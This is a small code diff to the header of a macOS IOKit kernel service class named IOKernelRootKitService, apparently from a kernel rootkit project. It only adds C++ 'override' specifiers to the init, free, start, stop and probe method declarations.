@@ -27,14 +27,14 @@ class IOKernelRootKitService : public IOService
 	OSDeclareDefaultStructors(IOKernelRootKitService)
 
 	public:
-		virtual bool init(OSDictionary *properties);
+		virtual bool init(OSDictionary *properties) override;
 
-		virtual void free();
+		virtual void free() override;
 
-		virtual bool start(IOService *provider);
-		virtual void stop(IOService *provider);
+		virtual bool start(IOService *provider) override;
+		virtual void stop(IOService *provider) override;
 
-		virtual IOService* probe(IOService *provider, SInt32 *score);
+		virtual IOService* probe(IOService *provider, SInt32 *score) override;
 
 		virtual void clientClosed(IOKernelRootKitUserClient *client);
 
